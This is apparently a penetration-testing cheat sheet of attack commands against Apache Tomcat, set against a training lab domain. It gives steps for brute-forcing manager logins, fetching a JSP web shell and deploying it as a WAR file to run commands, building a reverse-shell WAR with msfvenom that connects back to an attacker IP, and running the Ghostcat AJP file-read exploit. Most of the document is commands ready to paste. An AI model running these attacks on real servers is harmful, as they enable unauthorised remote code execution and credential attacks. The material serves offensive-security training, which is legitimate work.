# Tomcat - Discovery & Enumeration
## Discovery/Footprinting
```
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
```
## Enumeration
1. Look for the /manager and the /host-manager pages.
```
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

# Attacking Tomcat
if we can access the /manager or /host-manager endpoints, we can likely achieve remote code execution on the Tomcat server
## Tomcat Manager - Login Brute Force
### Metasploit
```
auxiliary/scanner/http/tomcat_mgr_login
```
Metasploit module (or another tool) is failing or not behaving the way we believe it should. We can always use Burp Suite or ZAP to proxy the traffic and troubleshoot. To do this, first, fire up Burp Suite and then set the PROXIES option like the following:
1. set PROXIES HTTP:127.0.0.1:8008
2. Check Burp

### Brute Force tool
https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
```
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

## Tomcat Manager - WAR File Upload
Many Tomcat installations provide a GUI interface to manage the application. This interface is available at /manager/html by default, which only users assigned the manager-gui role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application.
1. Browse to http://web01.inlanefreight.local:8180/manager/html and enter the credentials
2. The manager web app allows us to instantly deploy new applications by uploading WAR files
	1. `wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp`
	2. `zip -r backup.war cmd.jsp`
3. Click on Browse to select the .war file and then click on Deploy
4. This file is uploaded to the manager GUI, after which the /backup application will be added to the table
```
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

### msfvenom
1. We could also use msfvenom to generate a malicious WAR file
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```
2. Start a Netcat listener and click on /backup to execute the shell
3. The `multi/http/tomcat_mgr_upload` Metasploit module can be used to automate the process shown above

### CVE-2020-1938 : Ghostcat
All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable. This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat.
1. The AJP service is usually running at port 8009 on a Tomcat server. This can be checked with a targeted Nmap scan.
2. Confirm that ports 8080 and 8009 are open
3. The exploit can only read files and folders within the web apps folder, which means that files like /etc/passwd can’t be accessed. Let’s attempt to access the web.xml
```
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```
https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi

### Check for reverse proxy
if apache is being used as a reverse proxy with Java as backend service, then the host machine is vulnerable to a vulnerability that considers `/..;/` the parent directory

### Check for log4j vulnerability
